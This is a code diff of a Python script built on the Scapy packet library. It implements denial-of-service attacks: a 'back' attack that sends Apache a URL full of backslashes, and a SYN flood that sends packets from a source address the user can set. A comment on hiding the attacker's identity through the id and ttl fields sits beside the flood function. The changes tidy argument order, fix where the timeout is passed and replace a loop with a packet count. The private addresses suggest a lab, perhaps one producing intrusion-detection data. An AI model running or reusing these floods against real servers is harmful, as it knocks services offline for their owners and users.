@@ -9,13 +9,13 @@ from datetime import datetime
 # Denial of service attack against apache web server where a client
 # requests a URL containing many backslashes
 # Can just try the HTTP LIB to use this for us?
-def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
+def back(target_ip, payload, target_port=80, src_ip="192.168.147.150"):
     print("Executing back at: " + str(datetime.now()))
     # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
     i = IP(src=src_ip, dst=target_ip)
-    t = TCP(flags="S", dport=int(target_port), sport=RandShort(), timeout=2)
+    t = TCP(flags="S", dport=int(target_port), sport=RandShort())
     back_attack = i / t / Raw(payload=payload)
-    replies = sr(back_attack)
+    replies = sr(back_attack, timeout=2)
     for packet in replies:
         print(packet)
 
@@ -24,13 +24,9 @@ def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
 # You can use the id and ttl fields to help hide the identity of the attacker
 def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=1000):
     print("Executing SYN Flood at: " + str(datetime.now()))
-    count = 0
-    while count < packets_send:
-        # Creates the packet and assigns it to variable a
-        a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
-        send(a, verbose=False)
-        count = count + 1
-        # print(str(count) + " Packets Sent")
+    # Creates the packet and assigns it to variable a
+    a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
+    send(a, verbose=False, count=packets_send)
 
     # another way to do this is to use
     # ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
